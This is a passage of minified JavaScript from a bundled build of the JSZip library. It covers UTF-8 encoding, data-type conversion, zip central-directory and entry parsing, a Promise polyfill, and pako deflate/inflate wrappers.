e,r,i,n,s,a=t.length,o=0;for(n=0;n<a;n++)55296==(64512&(r=t.charCodeAt(n)))&&n+1<a&&56320==(64512&(i=t.charCodeAt(n+1)))&&(r=65536+(r-55296<<10)+(i-56320),n++),o+=r<128?1:r<2048?2:r<65536?3:4;for(e=h.uint8array?new Uint8Array(o):new Array(o),n=s=0;s<o;n++)55296==(64512&(r=t.charCodeAt(n)))&&n+1<a&&56320==(64512&(i=t.charCodeAt(n+1)))&&(r=65536+(r-55296<<10)+(i-56320),n++),r<128?e[s++]=r:(r<2048?e[s++]=192|r>>>6:(r<65536?e[s++]=224|r>>>12:(e[s++]=240|r>>>18,e[s++]=128|r>>>12&63),e[s++]=128|r>>>6&63),e[s++]=128|63&r);return e}(t)},s.utf8decode=function(t){return h.nodebuffer?o.transformTo("nodebuffer",t).toString("utf-8"):function(t){var e,r,i,n,s=t.length,a=new Array(2*s);for(e=r=0;e<s;)if((i=t[e++])<128)a[r++]=i;else if(4<(n=u[i]))a[r++]=65533,e+=n-1;else{for(i&=2===n?31:3===n?15:7;1<n&&e<s;)i=i<<6|63&t[e++],n--;1<n?a[r++]=65533:i<65536?a[r++]=i:(i-=65536,a[r++]=55296|i>>10&1023,a[r++]=56320|1023&i)}return a.length!==r&&(a.subarray?a=a.subarray(0,r):a.length=r),o.applyFromCharCode(a)}(t=o.transformTo(h.uint8array?"uint8array":"array",t))},o.inherits(a,i),a.prototype.processChunk=function(t){var e=o.transformTo(h.uint8array?"uint8array":"array",t.data);if(this.leftOver&&this.leftOver.length){if(h.uint8array){var r=e;(e=new Uint8Array(r.length+this.leftOver.length)).set(this.leftOver,0),e.set(r,this.leftOver.length)}else e=this.leftOver.concat(e);this.leftOver=null}var i=function(t,e){var r;for((e=e||t.length)>t.length&&(e=t.length),r=e-1;0<=r&&128==(192&t[r]);)r--;return r<0?e:0===r?e:r+u[t[r]]>e?r:e}(e),n=e;i!==e.length&&(h.uint8array?(n=e.subarray(0,i),this.leftOver=e.subarray(i,e.length)):(n=e.slice(0,i),this.leftOver=e.slice(i,e.length))),this.push({data:s.utf8decode(n),meta:t.meta})},a.prototype.flush=function(){this.leftOver&&this.leftOver.length&&(this.push({data:s.utf8decode(this.leftOver),meta:{}}),this.leftOver=null)},s.Utf8DecodeWorker=a,o.inherits(l,i),l.prototype.processChunk=function(t){this.push({data:s.utf8encode(t.data),meta:t.meta})},s.Utf8EncodeWorker=l},{"./nodejsUtils":14,"./stream/GenericWorker":28,"./support":30,"./utils":32}],32:[function(t,e,a){"use strict";var o=t("./support"),h=t("./base64"),r=t("./nodejsUtils"),i=t("set-immediate-shim"),u=t("./external");function n(t){return t}function l(t,e){for(var r=0;r<t.length;++r)e[r]=255&t.charCodeAt(r);return e}a.newBlob=function(e,r){a.checkSupport("blob");try{return new Blob([e],{type:r})}catch(t){try{var i=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);return i.append(e),i.getBlob(r)}catch(t){throw new Error("Bug : can't construct the Blob.")}}};var s={stringifyByChunk:function(t,e,r){var i=[],n=0,s=t.length;if(s<=r)return String.fromCharCode.apply(null,t);for(;n<s;)"array"===e||"nodebuffer"===e?i.push(String.fromCharCode.apply(null,t.slice(n,Math.min(n+r,s)))):i.push(String.fromCharCode.apply(null,t.subarray(n,Math.min(n+r,s)))),n+=r;return i.join("")},stringifyByChar:function(t){for(var e="",r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},applyCanBeUsed:{uint8array:function(){try{return o.uint8array&&1===String.fromCharCode.apply(null,new Uint8Array(1)).length}catch(t){return!1}}(),nodebuffer:function(){try{return o.nodebuffer&&1===String.fromCharCode.apply(null,r.allocBuffer(1)).length}catch(t){return!1}}()}};function f(t){var e=65536,r=a.getTypeOf(t),i=!0;if("uint8array"===r?i=s.applyCanBeUsed.uint8array:"nodebuffer"===r&&(i=s.applyCanBeUsed.nodebuffer),i)for(;1<e;)try{return s.stringifyByChunk(t,r,e)}catch(t){e=Math.floor(e/2)}return s.stringifyByChar(t)}function d(t,e){for(var r=0;r<t.length;r++)e[r]=t[r];return e}a.applyFromCharCode=f;var c={};c.string={string:n,array:function(t){return l(t,new Array(t.length))},arraybuffer:function(t){return c.string.uint8array(t).buffer},uint8array:function(t){return l(t,new Uint8Array(t.length))},nodebuffer:function(t){return l(t,r.allocBuffer(t.length))}},c.array={string:f,array:n,arraybuffer:function(t){return new Uint8Array(t).buffer},uint8array:function(t){return new Uint8Array(t)},nodebuffer:function(t){return r.newBufferFrom(t)}},c.arraybuffer={string:function(t){return f(new Uint8Array(t))},array:function(t){return d(new Uint8Array(t),new Array(t.byteLength))},arraybuffer:n,uint8array:function(t){return new Uint8Array(t)},nodebuffer:function(t){return r.newBufferFrom(new Uint8Array(t))}},c.uint8array={string:f,array:function(t){return d(t,new Array(t.length))},arraybuffer:function(t){return t.buffer},uint8array:n,nodebuffer:function(t){return r.newBufferFrom(t)}},c.nodebuffer={string:f,array:function(t){return d(t,new Array(t.length))},arraybuffer:function(t){return c.nodebuffer.uint8array(t).buffer},uint8array:function(t){return d(t,new Uint8Array(t.length))},nodebuffer:n},a.transformTo=function(t,e){if(e=e||"",!t)return e;a.checkSupport(t);var r=a.getTypeOf(e);return c[r][t](e)},a.getTypeOf=function(t){return"string"==typeof t?"string":"[object Array]"===Object.prototype.toString.call(t)?"array":o.nodebuffer&&r.isBuffer(t)?"nodebuffer":o.uint8array&&t instanceof Uint8Array?"uint8array":o.arraybuffer&&t instanceof ArrayBuffer?"arraybuffer":void 0},a.checkSupport=function(t){if(!o[t.toLowerCase()])throw new Error(t+" is not supported by this platform")},a.MAX_VALUE_16BITS=65535,a.MAX_VALUE_32BITS=-1,a.pretty=function(t){var e,r,i="";for(r=0;r<(t||"").length;r++)i+="\\x"+((e=t.charCodeAt(r))<16?"0":"")+e.toString(16).toUpperCase();return i},a.delay=function(t,e,r){i(function(){t.apply(r||null,e||[])})},a.inherits=function(t,e){function r(){}r.prototype=e.prototype,t.prototype=new r},a.extend=function(){var t,e,r={};for(t=0;t<arguments.length;t++)for(e in arguments[t])arguments[t].hasOwnProperty(e)&&void 0===r[e]&&(r[e]=arguments[t][e]);return r},a.prepareContent=function(r,t,i,n,s){return u.Promise.resolve(t).then(function(i){return o.blob&&(i instanceof Blob||-1!==["[object File]","[object Blob]"].indexOf(Object.prototype.toString.call(i)))&&"undefined"!=typeof FileReader?new u.Promise(function(e,r){var t=new FileReader;t.onload=function(t){e(t.target.result)},t.onerror=function(t){r(t.target.error)},t.readAsArrayBuffer(i)}):i}).then(function(t){var e=a.getTypeOf(t);return e?("arraybuffer"===e?t=a.transformTo("uint8array",t):"string"===e&&(s?t=h.decode(t):i&&!0!==n&&(t=function(t){return l(t,o.uint8array?new Uint8Array(t.length):new Array(t.length))}(t))),t):u.Promise.reject(new Error("Can't read the data of '"+r+"'. Is it in a supported JavaScript type (String, Blob, ArrayBuffer, etc) ?"))})}},{"./base64":1,"./external":6,"./nodejsUtils":14,"./support":30,"set-immediate-shim":54}],33:[function(t,e,r){"use strict";var i=t("./reader/readerFor"),n=t("./utils"),s=t("./signature"),a=t("./zipEntry"),o=(t("./utf8"),t("./support"));function h(t){this.files=[],this.loadOptions=t}h.prototype={checkSignature:function(t){if(!this.reader.readAndCheckSignature(t)){this.reader.index-=4;var e=this.reader.readString(4);throw new Error("Corrupted zip or bug: unexpected signature ("+n.pretty(e)+", expected "+n.pretty(t)+")")}},isSignature:function(t,e){var r=this.reader.index;this.reader.setIndex(t);var i=this.reader.readString(4)===e;return this.reader.setIndex(r),i},readBlockEndOfCentral:function(){this.diskNumber=this.reader.readInt(2),this.diskWithCentralDirStart=this.reader.readInt(2),this.centralDirRecordsOnThisDisk=this.reader.readInt(2),this.centralDirRecords=this.reader.readInt(2),this.centralDirSize=this.reader.readInt(4),this.centralDirOffset=this.reader.readInt(4),this.zipCommentLength=this.reader.readInt(2);var t=this.reader.readData(this.zipCommentLength),e=o.uint8array?"uint8array":"array",r=n.transformTo(e,t);this.zipComment=this.loadOptions.decodeFileName(r)},readBlockZip64EndOfCentral:function(){this.zip64EndOfCentralSize=this.reader.readInt(8),this.reader.skip(4),this.diskNumber=this.reader.readInt(4),this.diskWithCentralDirStart=this.reader.readInt(4),this.centralDirRecordsOnThisDisk=this.reader.readInt(8),this.centralDirRecords=this.reader.readInt(8),this.centralDirSize=this.reader.readInt(8),this.centralDirOffset=this.reader.readInt(8),this.zip64ExtensibleData={};for(var t,e,r,i=this.zip64EndOfCentralSize-44;0<i;)t=this.reader.readInt(2),e=this.reader.readInt(4),r=this.reader.readData(e),this.zip64ExtensibleData[t]={id:t,length:e,value:r}},readBlockZip64EndOfCentralLocator:function(){if(this.diskWithZip64CentralDirStart=this.reader.readInt(4),this.relativeOffsetEndOfZip64CentralDir=this.reader.readInt(8),this.disksCount=this.reader.readInt(4),1<this.disksCount)throw new Error("Multi-volumes zip are not supported")},readLocalFiles:function(){var t,e;for(t=0;t<this.files.length;t++)e=this.files[t],this.reader.setIndex(e.localHeaderOffset),this.checkSignature(s.LOCAL_FILE_HEADER),e.readLocalPart(this.reader),e.handleUTF8(),e.processAttributes()},readCentralDir:function(){var t;for(this.reader.setIndex(this.centralDirOffset);this.reader.readAndCheckSignature(s.CENTRAL_FILE_HEADER);)(t=new a({zip64:this.zip64},this.loadOptions)).readCentralPart(this.reader),this.files.push(t);if(this.centralDirRecords!==this.files.length&&0!==this.centralDirRecords&&0===this.files.length)throw new Error("Corrupted zip or bug: expected "+this.centralDirRecords+" records in central dir, got "+this.files.length)},readEndOfCentral:function(){var t=this.reader.lastIndexOfSignature(s.CENTRAL_DIRECTORY_END);if(t<0)throw!this.isSignature(0,s.LOCAL_FILE_HEADER)?new Error("Can't find end of central directory : is this a zip file ? If it is, see https://stuk.github.io/jszip/documentation/howto/read_zip.html"):new Error("Corrupted zip: can't find end of central directory");this.reader.setIndex(t);var e=t;if(this.checkSignature(s.CENTRAL_DIRECTORY_END),this.readBlockEndOfCentral(),this.diskNumber===n.MAX_VALUE_16BITS||this.diskWithCentralDirStart===n.MAX_VALUE_16BITS||this.centralDirRecordsOnThisDisk===n.MAX_VALUE_16BITS||this.centralDirRecords===n.MAX_VALUE_16BITS||this.centralDirSize===n.MAX_VALUE_32BITS||this.centralDirOffset===n.MAX_VALUE_32BITS){if(this.zip64=!0,(t=this.reader.lastIndexOfSignature(s.ZIP64_CENTRAL_DIRECTORY_LOCATOR))<0)throw new Error("Corrupted zip: can't find the ZIP64 end of central directory locator");if(this.reader.setIndex(t),this.checkSignature(s.ZIP64_CENTRAL_DIRECTORY_LOCATOR),this.readBlockZip64EndOfCentralLocator(),!this.isSignature(this.relativeOffsetEndOfZip64CentralDir,s.ZIP64_CENTRAL_DIRECTORY_END)&&(this.relativeOffsetEndOfZip64CentralDir=this.reader.lastIndexOfSignature(s.ZIP64_CENTRAL_DIRECTORY_END),this.relativeOffsetEndOfZip64CentralDir<0))throw new Error("Corrupted zip: can't find the ZIP64 end of central directory");this.reader.setIndex(this.relativeOffsetEndOfZip64CentralDir),this.checkSignature(s.ZIP64_CENTRAL_DIRECTORY_END),this.readBlockZip64EndOfCentral()}var r=this.centralDirOffset+this.centralDirSize;this.zip64&&(r+=20,r+=12+this.zip64EndOfCentralSize);var i=e-r;if(0<i)this.isSignature(e,s.CENTRAL_FILE_HEADER)||(this.reader.zero=i);else if(i<0)throw new Error("Corrupted zip: missing "+Math.abs(i)+" bytes.")},prepareReader:function(t){this.reader=i(t)},load:function(t){this.prepareReader(t),this.readEndOfCentral(),this.readCentralDir(),this.readLocalFiles()}},e.exports=h},{"./reader/readerFor":22,"./signature":23,"./support":30,"./utf8":31,"./utils":32,"./zipEntry":34}],34:[function(t,e,r){"use strict";var i=t("./reader/readerFor"),s=t("./utils"),n=t("./compressedObject"),a=t("./crc32"),o=t("./utf8"),h=t("./compressions"),u=t("./support");function l(t,e){this.options=t,this.loadOptions=e}l.prototype={isEncrypted:function(){return 1==(1&this.bitFlag)},useUTF8:function(){return 2048==(2048&this.bitFlag)},readLocalPart:function(t){var e,r;if(t.skip(22),this.fileNameLength=t.readInt(2),r=t.readInt(2),this.fileName=t.readData(this.fileNameLength),t.skip(r),-1===this.compressedSize||-1===this.uncompressedSize)throw new Error("Bug or corrupted zip : didn't get enough informations from the central directory (compressedSize === -1 || uncompressedSize === -1)");if(null===(e=function(t){for(var e in h)if(h.hasOwnProperty(e)&&h[e].magic===t)return h[e];return null}(this.compressionMethod)))throw new Error("Corrupted zip : compression "+s.pretty(this.compressionMethod)+" unknown (inner file : "+s.transformTo("string",this.fileName)+")");this.decompressed=new n(this.compressedSize,this.uncompressedSize,this.crc32,e,t.readData(this.compressedSize))},readCentralPart:function(t){this.versionMadeBy=t.readInt(2),t.skip(2),this.bitFlag=t.readInt(2),this.compressionMethod=t.readString(2),this.date=t.readDate(),this.crc32=t.readInt(4),this.compressedSize=t.readInt(4),this.uncompressedSize=t.readInt(4);var e=t.readInt(2);if(this.extraFieldsLength=t.readInt(2),this.fileCommentLength=t.readInt(2),this.diskNumberStart=t.readInt(2),this.internalFileAttributes=t.readInt(2),this.externalFileAttributes=t.readInt(4),this.localHeaderOffset=t.readInt(4),this.isEncrypted())throw new Error("Encrypted zip are not supported");t.skip(e),this.readExtraFields(t),this.parseZIP64ExtraField(t),this.fileComment=t.readData(this.fileCommentLength)},processAttributes:function(){this.unixPermissions=null,this.dosPermissions=null;var t=this.versionMadeBy>>8;this.dir=!!(16&this.externalFileAttributes),0==t&&(this.dosPermissions=63&this.externalFileAttributes),3==t&&(this.unixPermissions=this.externalFileAttributes>>16&65535),this.dir||"/"!==this.fileNameStr.slice(-1)||(this.dir=!0)},parseZIP64ExtraField:function(t){if(this.extraFields[1]){var e=i(this.extraFields[1].value);this.uncompressedSize===s.MAX_VALUE_32BITS&&(this.uncompressedSize=e.readInt(8)),this.compressedSize===s.MAX_VALUE_32BITS&&(this.compressedSize=e.readInt(8)),this.localHeaderOffset===s.MAX_VALUE_32BITS&&(this.localHeaderOffset=e.readInt(8)),this.diskNumberStart===s.MAX_VALUE_32BITS&&(this.diskNumberStart=e.readInt(4))}},readExtraFields:function(t){var e,r,i,n=t.index+this.extraFieldsLength;for(this.extraFields||(this.extraFields={});t.index<n;)e=t.readInt(2),r=t.readInt(2),i=t.readData(r),this.extraFields[e]={id:e,length:r,value:i}},handleUTF8:function(){var t=u.uint8array?"uint8array":"array";if(this.useUTF8())this.fileNameStr=o.utf8decode(this.fileName),this.fileCommentStr=o.utf8decode(this.fileComment);else{var e=this.findExtraFieldUnicodePath();if(null!==e)this.fileNameStr=e;else{var r=s.transformTo(t,this.fileName);this.fileNameStr=this.loadOptions.decodeFileName(r)}var i=this.findExtraFieldUnicodeComment();if(null!==i)this.fileCommentStr=i;else{var n=s.transformTo(t,this.fileComment);this.fileCommentStr=this.loadOptions.decodeFileName(n)}}},findExtraFieldUnicodePath:function(){var t=this.extraFields[28789];if(t){var e=i(t.value);return 1!==e.readInt(1)?null:a(this.fileName)!==e.readInt(4)?null:o.utf8decode(e.readData(t.length-5))}return null},findExtraFieldUnicodeComment:function(){var t=this.extraFields[25461];if(t){var e=i(t.value);return 1!==e.readInt(1)?null:a(this.fileComment)!==e.readInt(4)?null:o.utf8decode(e.readData(t.length-5))}return null}},e.exports=l},{"./compressedObject":2,"./compressions":3,"./crc32":4,"./reader/readerFor":22,"./support":30,"./utf8":31,"./utils":32}],35:[function(t,e,r){"use strict";function i(t,e,r){this.name=t,this.dir=r.dir,this.date=r.date,this.comment=r.comment,this.unixPermissions=r.unixPermissions,this.dosPermissions=r.dosPermissions,this._data=e,this._dataBinary=r.binary,this.options={compression:r.compression,compressionOptions:r.compressionOptions}}var s=t("./stream/StreamHelper"),n=t("./stream/DataWorker"),a=t("./utf8"),o=t("./compressedObject"),h=t("./stream/GenericWorker");i.prototype={internalStream:function(t){var e=null,r="string";try{if(!t)throw new Error("No output type specified.");var i="string"===(r=t.toLowerCase())||"text"===r;"binarystring"!==r&&"text"!==r||(r="string"),e=this._decompressWorker();var n=!this._dataBinary;n&&!i&&(e=e.pipe(new a.Utf8EncodeWorker)),!n&&i&&(e=e.pipe(new a.Utf8DecodeWorker))}catch(t){(e=new h("error")).error(t)}return new s(e,r,"")},async:function(t,e){return this.internalStream(t).accumulate(e)},nodeStream:function(t,e){return this.internalStream(t||"nodebuffer").toNodejsStream(e)},_compressWorker:function(t,e){if(this._data instanceof o&&this._data.compression.magic===t.magic)return this._data.getCompressedWorker();var r=this._decompressWorker();return this._dataBinary||(r=r.pipe(new a.Utf8EncodeWorker)),o.createWorkerFrom(r,t,e)},_decompressWorker:function(){return this._data instanceof o?this._data.getContentWorker():this._data instanceof h?this._data:new n(this._data)}};for(var u=["asText","asBinary","asNodeBuffer","asUint8Array","asArrayBuffer"],l=function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},f=0;f<u.length;f++)i.prototype[u[f]]=l;e.exports=i},{"./compressedObject":2,"./stream/DataWorker":27,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31}],36:[function(t,l,e){(function(e){"use strict";var r,i,t=e.MutationObserver||e.WebKitMutationObserver;if(t){var n=0,s=new t(u),a=e.document.createTextNode("");s.observe(a,{characterData:!0}),r=function(){a.data=n=++n%2}}else if(e.setImmediate||void 0===e.MessageChannel)r="document"in e&&"onreadystatechange"in e.document.createElement("script")?function(){var t=e.document.createElement("script");t.onreadystatechange=function(){u(),t.onreadystatechange=null,t.parentNode.removeChild(t),t=null},e.document.documentElement.appendChild(t)}:function(){setTimeout(u,0)};else{var o=new e.MessageChannel;o.port1.onmessage=u,r=function(){o.port2.postMessage(0)}}var h=[];function u(){var t,e;i=!0;for(var r=h.length;r;){for(e=h,h=[],t=-1;++t<r;)e[t]();r=h.length}i=!1}l.exports=function(t){1!==h.push(t)||i||r()}}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],37:[function(t,e,r){"use strict";var n=t("immediate");function u(){}var l={},s=["REJECTED"],a=["FULFILLED"],i=["PENDING"];function o(t){if("function"!=typeof t)throw new TypeError("resolver must be a function");this.state=i,this.queue=[],this.outcome=void 0,t!==u&&c(this,t)}function h(t,e,r){this.promise=t,"function"==typeof e&&(this.onFulfilled=e,this.callFulfilled=this.otherCallFulfilled),"function"==typeof r&&(this.onRejected=r,this.callRejected=this.otherCallRejected)}function f(e,r,i){n(function(){var t;try{t=r(i)}catch(t){return l.reject(e,t)}t===e?l.reject(e,new TypeError("Cannot resolve promise with itself")):l.resolve(e,t)})}function d(t){var e=t&&t.then;if(t&&("object"==typeof t||"function"==typeof t)&&"function"==typeof e)return function(){e.apply(t,arguments)}}function c(e,t){var r=!1;function i(t){r||(r=!0,l.reject(e,t))}function n(t){r||(r=!0,l.resolve(e,t))}var s=p(function(){t(n,i)});"error"===s.status&&i(s.value)}function p(t,e){var r={};try{r.value=t(e),r.status="success"}catch(t){r.status="error",r.value=t}return r}(e.exports=o).prototype.finally=function(e){if("function"!=typeof e)return this;var r=this.constructor;return this.then(function(t){return r.resolve(e()).then(function(){return t})},function(t){return r.resolve(e()).then(function(){throw t})})},o.prototype.catch=function(t){return this.then(null,t)},o.prototype.then=function(t,e){if("function"!=typeof t&&this.state===a||"function"!=typeof e&&this.state===s)return this;var r=new this.constructor(u);this.state!==i?f(r,this.state===a?t:e,this.outcome):this.queue.push(new h(r,t,e));return r},h.prototype.callFulfilled=function(t){l.resolve(this.promise,t)},h.prototype.otherCallFulfilled=function(t){f(this.promise,this.onFulfilled,t)},h.prototype.callRejected=function(t){l.reject(this.promise,t)},h.prototype.otherCallRejected=function(t){f(this.promise,this.onRejected,t)},l.resolve=function(t,e){var r=p(d,e);if("error"===r.status)return l.reject(t,r.value);var i=r.value;if(i)c(t,i);else{t.state=a,t.outcome=e;for(var n=-1,s=t.queue.length;++n<s;)t.queue[n].callFulfilled(e)}return t},l.reject=function(t,e){t.state=s,t.outcome=e;for(var r=-1,i=t.queue.length;++r<i;)t.queue[r].callRejected(e);return t},o.resolve=function(t){if(t instanceof this)return t;return l.resolve(new this(u),t)},o.reject=function(t){var e=new this(u);return l.reject(e,t)},o.all=function(t){var r=this;if("[object Array]"!==Object.prototype.toString.call(t))return this.reject(new TypeError("must be an array"));var i=t.length,n=!1;if(!i)return this.resolve([]);var s=new Array(i),a=0,e=-1,o=new this(u);for(;++e<i;)h(t[e],e);return o;function h(t,e){r.resolve(t).then(function(t){s[e]=t,++a!==i||n||(n=!0,l.resolve(o,s))},function(t){n||(n=!0,l.reject(o,t))})}},o.race=function(t){var e=this;if("[object Array]"!==Object.prototype.toString.call(t))return this.reject(new TypeError("must be an array"));var r=t.length,i=!1;if(!r)return this.resolve([]);var n=-1,s=new this(u);for(;++n<r;)a=t[n],e.resolve(a).then(function(t){i||(i=!0,l.resolve(s,t))},function(t){i||(i=!0,l.reject(s,t))});var a;return s}},{immediate:36}],38:[function(t,e,r){"use strict";var i={};(0,t("./lib/utils/common").assign)(i,t("./lib/deflate"),t("./lib/inflate"),t("./lib/zlib/constants")),e.exports=i},{"./lib/deflate":39,"./lib/inflate":40,"./lib/utils/common":41,"./lib/zlib/constants":44}],39:[function(t,e,r){"use strict";var a=t("./zlib/deflate"),o=t("./utils/common"),h=t("./utils/strings"),n=t("./zlib/messages"),s=t("./zlib/zstream"),u=Object.prototype.toString,l=0,f=-1,d=0,c=8;function p(t){if(!(this instanceof p))return new p(t);this.options=o.assign({level:f,method:c,chunkSize:16384,windowBits:15,memLevel:8,strategy:d,to:""},t||{});var e=this.options;e.raw&&0<e.windowBits?e.windowBits=-e.windowBits:e.gzip&&0<e.windowBits&&e.windowBits<16&&(e.windowBits+=16),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new s,this.strm.avail_out=0;var r=a.deflateInit2(this.strm,e.level,e.method,e.windowBits,e.memLevel,e.strategy);if(r!==l)throw new Error(n[r]);if(e.header&&a.deflateSetHeader(this.strm,e.header),e.dictionary){var i;if(i="string"==typeof e.dictionary?h.string2buf(e.dictionary):"[object ArrayBuffer]"===u.call(e.dictionary)?new Uint8Array(e.dictionary):e.dictionary,(r=a.deflateSetDictionary(this.strm,i))!==l)throw new Error(n[r]);this._dict_set=!0}}function i(t,e){var r=new p(e);if(r.push(t,!0),r.err)throw r.msg||n[r.err];return r.result}p.prototype.push=function(t,e){var r,i,n=this.strm,s=this.options.chunkSize;if(this.ended)return!1;i=e===~~e?e:!0===e?4:0,"string"==typeof t?n.input=h.string2buf(t):"[object ArrayBuffer]"===u.call(t)?n.input=new Uint8Array(t):n.input=t,n.next_in=0,n.avail_in=n.input.length;do{if(0===n.avail_out&&(n.output=new o.Buf8(s),n.next_out=0,n.avail_out=s),1!==(r=a.deflate(n,i))&&r!==l)return this.onEnd(r),!(this.ended=!0);0!==n.avail_out&&(0!==n.avail_in||4!==i&&2!==i)||("string"===this.options.to?this.onData(h.buf2binstring(o.shrinkBuf(n.output,n.next_out))):this.onData(o.shrinkBuf(n.output,n.next_out)))}while((0<n.avail_in||0===n.avail_out)&&1!==r);return 4===i?(r=a.deflateEnd(this.strm),this.onEnd(r),this.ended=!0,r===l):2!==i||(this.onEnd(l),!(n.avail_out=0))},p.prototype.onData=function(t){this.chunks.push(t)},p.prototype.onEnd=function(t){t===l&&("string"===this.options.to?this.result=this.chunks.join(""):this.result=o.flattenChunks(this.chunks)),this.chunks=[],this.err=t,this.msg=this.strm.msg},r.Deflate=p,r.deflate=i,r.deflateRaw=function(t,e){return(e=e||{}).raw=!0,i(t,e)},r.gzip=function(t,e){return(e=e||{}).gzip=!0,i(t,e)}},{"./utils/common":41,"./utils/strings":42,"./zlib/deflate":46,"./zlib/messages":51,"./zlib/zstream":53}],40:[function(t,e,r){"use strict";var d=t("./zlib/inflate"),c=t("./utils/common"),p=t("./utils/strings"),m=t("./zlib/constants"),i=t("./zlib/messages"),n=t("./zlib/zstream"),s=t("./zlib/gzheader"),_=Object.prototype.toString;function a(t){if(!(this instanceof a))return new a(t);this.options=c.assign({chunkSize:16384,windowBits:0,to:""},t||{});var e=this.options;e.raw&&0<=e.windowBits&&e.windowBits<16&&(e.windowBits=-e.windowBits,0===e.windowBits&&(e.windowBits=-15)),!(0<=e.windowBits&&e.windowBits<16)||t&&t.windowBits||(e.windowBits+=32),15<e.windowBits&&e.windowBits<48&&0==(15&e.windowBits)&&(e.windowBits|=15),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new n,this.strm.avail_out=0;var r=d.inflateInit2(this.strm,e.windowBits);if(r!==m.Z_OK)throw new Error(i[r]);this.header=new s,d.inflateGetHeader(this.strm,this.header)}function o(t,e){var r=new a(e);if(r.push(t,!0),r.err)throw r.msg||i[r.err];return r.result}a.prototype.push=function(t,e){var r,i,n,s,a,o,h=this.strm,u=this.options.chunkSize,l=this.options.dictionary,f=!1;if(this.ended)return!1;i=e===~~e?e:!0===e?m.Z_FINISH:m.Z_NO_FLUSH,"string"==typeof t?h.input=p.binstring2buf(t):"[object ArrayBuffer]"===_.call(t)?h.input=new Uint8Array(t):h.input=t,h.next_in=0,h.avail_in=h.input.length;do{if(0===h.avail_out&&(h.output=new c.Buf8(u),h.next_out=0,h.avail_out=u),(r=d.inflate(h,m.Z_NO_FLUSH))===m.Z_NEED_DICT&&l&&(o="string"==typeof l?p.string2buf(l):"[object ArrayBuffer]"===_.call(l)?new Uint8Array(l):l,r=d.inflateSetDictionary(this.strm,o)),r===m.Z_BUF_ERROR&&!0===f&&(r=m.Z_OK,f=!1),r!==m.Z_STREAM_END&&r!==m.Z_OK)return this.onEnd(r),!(this.ended=!0);h.next_out&&(0!==h.avail_out&&r!==m.Z_STREAM_END&&(0!==h.avail_in||i!==m.Z_FINISH&&i!==m.Z_SYNC_FLUSH)||("string"===this.options.to?(n=p.utf8border(h.output,h.next_out),s=h.next_out-n,a=p.buf2string(h.output,n),h.next_out=s,h.avail_out=u-s,s&&c.arraySet(h.output,h.output,n,s,0),this.onData(a)):this.onData(c.shrinkBuf(h.output,h.next_out)))),0===h.avail_in&&0===h.avail_out&&(f=!0)}while((0<h.avail_in||0===h.avail_out)&&r!==m.Z_STREAM_END);return r===m.Z_STREAM_END&&(i=m.Z_FINISH),i===m.Z_FINISH?(r=d.inflateEnd(this.strm),this.onEnd(r),this.ended=!0,r===m.Z_OK):i!==m.Z_SYNC_FLUSH||(this.onEnd(m.Z_OK),!(h.avail_out=0))},a.prototype.onData=function(t){this.chunks.push(t)},a.prototype.onEnd=function(t){t===m.Z_OK&&("string"===this.options.to?this.result=this.chunks.join(""):this.result=c.flattenChunks(this.chunks)),this.chunks=[],this.err=t,this.msg=this.strm.msg},r.Inflate=a,r.inflate=o,r.inflateRaw=function(t,e){return(e=e||{}).raw=!0,o(t,e)},r.ungzip=o},{"./utils/common":41,"./utils/strings":42,"./zlib/constants":44,"./zlib/gzheader":47,"./zlib/inflate":49,"./zlib/messages":51,"./zlib/zstream":53}],41:[function(t,e,r){"use strict";var i="undefined"!=typeof Uint8Array&&"undefined"!=typeof Uint16Array&&"undefined"!=typeof Int32Array;r.assign=function(t){for(var e=Array.prototype.slice.call(arguments,1);e.length;){var r=e.shift();if(r){if("object"!=typeof r)throw new TypeError(r+"must be non-object");for(var i in r)r.hasOwnProperty(i)&&(t[i]=r[i])}}return t},r.shrinkBuf=function(t,e){return t.length===e?t:t.subarray?t.subarray(0,e):(t.length=e,t)};var n={arraySet:function(t,e,r,i,n){if(e.subarray&&t.subarray)t.set(e.subarray(r,r+i),n);else for(var s=0;s<i;s++)t[n+s]=e[r+s]},flattenChunks:function(t){var e,r,i,n,s,a;for(e=i=0,r=t.length;e<r;e++)i+=t[e].length;for(a=new Uint8Array(i),e=n=0,r=t.length;e<r;e++)s=t[e],a.set(s,n),n+=s.length;return a}},s={arraySet:function(t,e,r,i,n){for(var s=0;s<i;s++)t[n+s]=e[r+s]},flattenChunks:function(t){return[].concat.apply([],t)}};r.setTyped=function(t){t?(r.Buf8=Uint8Array,r.Buf16=Uint16Array,r.Buf32=Int32Array,r.assign(r,n)):(r.Buf8=Array,r.Buf16=Array,r.Buf32=Array,r.assign(r,s))},r.setTyped(i)},{}],42:[function(t,e,r){"use strict";var h=t("./common"),n=!0,s=!0;try{String.fromCharCode.apply(null,[0])}catch(t){n=!1}try{String.fromCharCode.apply(null,new Uint8Array(1))}catch(t){s=!1}for(var u=new h.Buf8(256),i=0;i<256;i++)u[i]=252<=i?6:248<=i?5:240<=i?4:224<=i?3:192<=i?2:1;function l(t,e){if(e<65537&&(t.subarray&&s||!t.subarray&&n))return String.fromCharCode.apply(null,h.shrinkBuf(t,e));for(var r="",i=0;i<e;i++)r+=String.fromCharCode(t[i]);return r}u[254]=u[254]=1,r.string2buf=function(t){var e,r,i,n,s,a=t.length,o=0;for(n=0;n<a;n++)55296==(64512&(r=t.charCodeAt(n)))&&n+1<a&&56320==(64512&(i=t.charCodeAt(n+1)))&&(r=65536+(r-55296<<10)+(i-56320),n++),o+=r<128?1:r<2048?2:r<65536?3:4;for(e=new h.Buf8(o),n=s=0;s<o;n++)55296==(64512&(r=t.charCodeAt(n)))&&n+1<a&&56320==(64512&(i=t.charCodeAt(n+1)))&&(r=65536+(r-55296<<10)+(i-56320),n++),r<128?e[s++]=r:(r<2048?e[s++]=192|r>>>6:(r<65536?e[s++]=224|r>>>12:(e[s++]=240|r>>>18,e[s++]=128|r>>>12&63),e[s++]=128|r>>>6&63),e[s++]=128|63&r);return e},r.buf2binstring=function(t){return l(t,t.length)},r.binstring2buf=function(t){for(var e=new 